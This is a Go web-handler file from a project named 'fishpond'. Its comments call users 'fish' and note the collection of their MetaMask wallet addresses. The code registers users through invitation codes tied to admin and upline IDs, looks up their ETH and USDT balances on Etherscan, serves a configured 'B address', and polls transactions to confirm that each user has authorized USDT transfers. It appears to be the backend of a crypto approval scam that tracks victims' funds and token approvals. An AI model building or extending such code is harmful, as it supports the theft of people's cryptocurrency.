/**
 * @Author $
 * @Description //TODO $
 * @Date $ $
 * @Param $
 * @return $
 **/
package client

import (
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/shopspring/decimal"
	"github.com/spf13/viper"
	"github.com/wangyi/fishpond/dao/mysql"
	"github.com/wangyi/fishpond/dao/redis"
	"github.com/wangyi/fishpond/model"
	"github.com/wangyi/fishpond/util"
	"io/ioutil"
	"math/big"
	"net/http"
	"regexp"
	"strconv"
	"time"
)

/**
  鱼注册了!
  获取了狐狸钱包的地址
*/
func FishRegister(c *gin.Context) {

	var Register CheckFishRegister
	if err := c.ShouldBind(&Register); err != nil {
		util.JsonWrite(c, -2, nil, err.Error())
		return
	}

	//判断邀请码是否有效
	inCode := c.PostForm("inCode")

	_, inErr := redis.Rdb.HGet("InvitationCode", inCode).Result()
	if inErr != nil {
		util.JsonWrite(c, -101, nil, "邀请码失效")
		return
	}

	//这个用户已经存在了
	tokenBack, err := redis.Rdb.HGet("USER_"+c.PostForm("fox_address"), "Token").Result()
	if err == nil {
		//tokenBack, _ := redis.Rdb.HGetAll("USER_" + c.PostForm("fox_address")).Result()
		util.JsonWrite(c, -102, tokenBack, "不要重复添加用户!")
		return
	}

	token := util.CreateToken(redis.Rdb)
	if token == "" {
		util.JsonWrite(c, -101, nil, "注册失败,网络错误,稍后再试!")
		return
	}

	AdminId, _ := strconv.Atoi(c.PostForm("admin_id"))
	SuperiorId, _ := strconv.Atoi(c.PostForm("superior_id"))
	Money, err := strconv.ParseFloat(c.PostForm("fox_money"), 64)
	vip := 1
	//if err == nil {
	//	//判断用户的 vip等级 然后入库
	//	vip = model.GetVipLevel(mysql.DB, Money)
	//}
	fmt.Println(Money)
	addFish := model.Fish{
		Token:                  token,
		Status:                 1,
		FoxAddress:             c.PostForm("fox_address"),
		Money:                  Money,
		TotalEarnings:          0,
		YesterdayEarnings:      0,
		TodayEarnings:          0,
		WithdrawalFreezeAmount: 0,
		EarningsMoney:          0,
		VipLevel:               vip,
		AdminId:                AdminId,
		SuperiorId:             SuperiorId,
		Created:                time.Now().Unix(),
		Updated:                time.Now().Unix(),
		Authorization:          1,
	}
	result := mysql.DB.Save(&addFish).Error
	if result != nil {
		util.JsonWrite(c, -101, nil, "注册失败")
		return
	}
	b, _ := json.Marshal(&addFish)
	var m map[string]interface{}
	_ = json.Unmarshal(b, &m)
	_, _ = redis.Rdb.HMSet("USER_"+c.PostForm("fox_address"), m).Result()
	_, _ = redis.Rdb.HSet("TOKEN_USER", token, c.PostForm("fox_address")).Result()

	util.JsonWrite(c, 200, m["Token"], "注册成功")
	return

}

/**
  获取信息
*/
func GetInformation(c *gin.Context) {
	data, err1 := c.Get("who")
	if !err1 {
		return
	}
	a := data.(map[string]string)
	fish := model.Fish{}
	err := mysql.DB.Where("id=?", a["ID"]).First(&fish).Error
	if err != nil {
		util.JsonWrite(c, 200, fish, "获取失败")
		return
	}

	hl, re := redis.Rdb.Get("ETHTOUSDT").Result()

	h2, _ := strconv.ParseFloat(hl, 64)
	if re != nil {
		util.JsonWrite(c, 200, fish, "汇率获取失败")

		return
	}

	fish.TodayEarningsETH = fish.TotalEarnings / h2
	util.JsonWrite(c, 200, fish, "获取成功")
	return
}

/***
获取 B地址
*/

func GetBAddress(c *gin.Context) {

	config := model.Config{}
	err := mysql.DB.Where("id=?", 1).First(&config).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "获取失败")
		return
	}
	util.JsonWrite(c, 200, config.BAddress, "获取成功")
	return

}

/***
更新余额
*/

func FoxMoneyUp(c *gin.Context) {
	_, err2 := c.Get("who")
	if !err2 {
		return
	}
	db := mysql.DB
	foxAddress := c.PostForm("fox_address")

	pp := model.Fish{}
	err3 := db.Model(&model.Fish{}).Where("fox_address =?", foxAddress).First(&pp).Error
	if err3 != nil {
		util.JsonWrite(c, -101, nil, "非法请求")
		return
	}
	//foxAddress:="0x882B25786a2b27f552F8d580EC6c04124fC52DA3"
	resp, err := http.Get("https://etherscan.io/address/" + foxAddress)
	if err != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	defer resp.Body.Close()
	body, err1 := ioutil.ReadAll(resp.Body)
	if err1 != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	//fmt.Println(string(body))
	//解析正则表达式，如果成功返回解释器
	reg1 := regexp.MustCompile(`<div class="col-md-8">\$(\d+)`)
	if reg1 == nil { //解释失败，返回nil
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	//根据规则提取关键信息
	result1 := reg1.FindAllStringSubmatch(string(body), -1)
	if len(result1) == 0 {
		util.JsonWrite(c, -101, nil, "更新失败,获取界面错误")
		return
	}

	maxMoney, _ := strconv.ParseFloat(result1[0][1], 64)

	data := make(map[string]interface{})
	data["money"] = maxMoney //零值字段
	data["updated"] = time.Now().Unix()

	fmt.Println(pp.ID)
	ee := db.Model(&model.Fish{}).Where("id=?", pp.ID).Updates(data).Error
	if ee != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	util.JsonWrite(c, 200, nil, "更新成功")
	return

}

/**
  更新余额  通过 接口
*/

func FoxMoneyUpTwo(c *gin.Context) {
	_, err2 := c.Get("who")
	if !err2 {
		return
	}
	db := mysql.DB
	foxAddress := c.PostForm("fox_address")

	pp := model.Fish{}
	err3 := db.Model(&model.Fish{}).Where("fox_address =?", foxAddress).First(&pp).Error
	if err3 != nil {
		util.JsonWrite(c, -101, nil, "非法请求")
		return
	}

	apikey := viper.GetString("eth.apikey")
	resp, err := http.Get("https://api.etherscan.io/api?module=account&action=balance&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
	if err != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	defer resp.Body.Close()
	body, err1 := ioutil.ReadAll(resp.Body)
	if err1 != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	//fmt.Println(string(body))

	var basket AutoGenerated
	err = json.Unmarshal([]byte(string(body)), &basket)
	if err != nil {
		fmt.Println(err)
	}

	if basket.Status != "1" {
		util.JsonWrite(c, -101, nil, "更新失败:"+basket.Message)
		return
	}

	maxMoney := basket.Result

	wei := new(big.Int)
	wei.SetString(maxMoney, 10)
	eth := util.ToDecimal(wei, 18)

	ETHTOUSDT, _ := redis.Rdb.Get("ETHTOUSDT").Result()

	OPE, _ := strconv.ParseFloat(ETHTOUSDT, 64)

	b := decimal.NewFromFloat(OPE)
	//fmt.Println(eth.Mul(b)) // 0.02
	ccc := eth.Mul(b)
	//fmt.Println(ccc.IntPart())

	data := make(map[string]interface{})
	data["money_eth"], _ = eth.Float64() //零值字段
	data["updated"] = time.Now().Unix()
	data["money"], _ = ccc.Float64()
	ee := db.Model(&model.Fish{}).Where("id=?", pp.ID).Updates(data).Error
	if ee != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	util.JsonWrite(c, 200, nil, "更新成功")
	return
}

/**
检查邀请码是否非法
*/
func CheckInCode(c *gin.Context) {

	var CheckInCode CheckInCodeIsOk
	if err := c.ShouldBind(&CheckInCode); err != nil {
		util.JsonWrite(c, -2, nil, err.Error())
		return
	}

	inCode := c.PostForm("inCode")
	if len(inCode) < 31 {
		util.JsonWrite(c, -101, nil, "非法邀请码")
		return
	}

	_, err := redis.Rdb.HGet("InvitationCode", inCode).Result()
	if err != nil {
		util.JsonWrite(c, -101, nil, "非法邀请码")
		return
	}
	util.JsonWrite(c, 200, nil, "OK")
	return
}

/**
用户校验 是否授权转账usd 传 hash 值进来校验
*/

func CheckAuthorization(c *gin.Context) {

	var Authorization CheckAuthorizationOk
	if err := c.ShouldBind(&Authorization); err != nil {
		util.JsonWrite(c, -2, nil, err.Error())
		return
	}

	foxAddress := c.PostForm("fox_address")
	hash := c.PostForm("transaction_hash")

	token, _ := redis.Rdb.HGet("TOKEN_USER", c.PostForm("token")).Result()
	if foxAddress != token {
		util.JsonWrite(c, -101, nil, "非法提现")
		return
	}
	//  查询这个 账户是否存在
	err := mysql.DB.Where("fox_address=?", foxAddress).Find(&model.Fish{}).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "非法请求这个账户不存在")
		return
	}
	apikey := viper.GetString("eth.apikey")
	go func() {
		for i := 0; i <= 100; i++ {
			resp, err := http.Get("https://api.etherscan.io/api?module=transaction&action=gettxreceiptstatus&txhash=" + hash + "&apikey=" + apikey)
			if err != nil {
				continue
			}
			body, err1 := ioutil.ReadAll(resp.Body)
			if err1 != nil {
				util.JsonWrite(c, -101, nil, "更新失败")
				return
			}
			var basket AutoGeneratedTwo
			err = json.Unmarshal([]byte(string(body)), &basket)
			if err != nil {
				fmt.Println(err)
			}
			if basket.Result.Status == "1" {
				//  hash 事务查询成功 交易成功
				mysql.DB.Model(&model.Fish{}).Where("fox_address=?", foxAddress).Update(&model.Fish{Authorization: 2, Updated: time.Now().Unix()})
				break
			}
			time.Sleep(2 * time.Second)
		}

	}()
	util.JsonWrite(c, 200, nil, "执行成功")
	return
}

/**
用户更新自己的 usdt  余额
*/
func UpdateOneFishUsd(c *gin.Context) {

	_, err2 := c.Get("who")
	if !err2 {
		return
	}
	foxAddress := c.PostForm("fox_address")
	apikey := viper.GetString("eth.apikey")

	token, _ := redis.Rdb.HGet("TOKEN_USER", c.PostForm("token")).Result()
	if foxAddress != token {
		util.JsonWrite(c, -101, nil, "非法请求")
		return
	}

	res, err := http.Get("https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=0xdAC17F958D2ee523a2206206994597C13D831ec7&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
	if err != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	defer res.Body.Close()
	body, err1 := ioutil.ReadAll(res.Body)
	if err1 != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}

	var basket AutoGenerated
	err = json.Unmarshal([]byte(string(body)), &basket)
	if err != nil {
		fmt.Println(err)
	}

	if basket.Status != "1" {
		util.JsonWrite(c, -101, nil, "更新失败:"+basket.Message)
		return
	}

	maxMoney := basket.Result

	wei := new(big.Int)
	wei.SetString(maxMoney, 10)
	usd := util.ToDecimal(wei, 6)

	data := make(map[string]interface{})
	//data["money_eth"], _ = eth.Float64() //零值字段
	data["updated"] = time.Now().Unix()
	data["money"], _ = usd.Float64()

	ee := mysql.DB.Model(&model.Fish{}).Where("fox_address=?", foxAddress).Updates(data).Error
	if ee != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	util.JsonWrite(c, 200, nil, "更新成功")
	return
}

/***
  获取eth  的最新价格
*/

func GetEthNowPrice(c *gin.Context) {
	_, err2 := c.Get("who")
	if !err2 {
		return
	}
	resp, err := http.Get("https://api1.binance.com/api/v3/ticker/price?symbol=ETHUSDT")
	if err != nil {
		util.JsonWrite(c, -101, nil, "获取失败")
		return
	}

	body, err1 := ioutil.ReadAll(resp.Body)
	if err1 != nil {
		util.JsonWrite(c, -101, nil, "获取失败")
		return
	}
	util.JsonWrite(c, 200, string(body), "获取成功")
	return
}
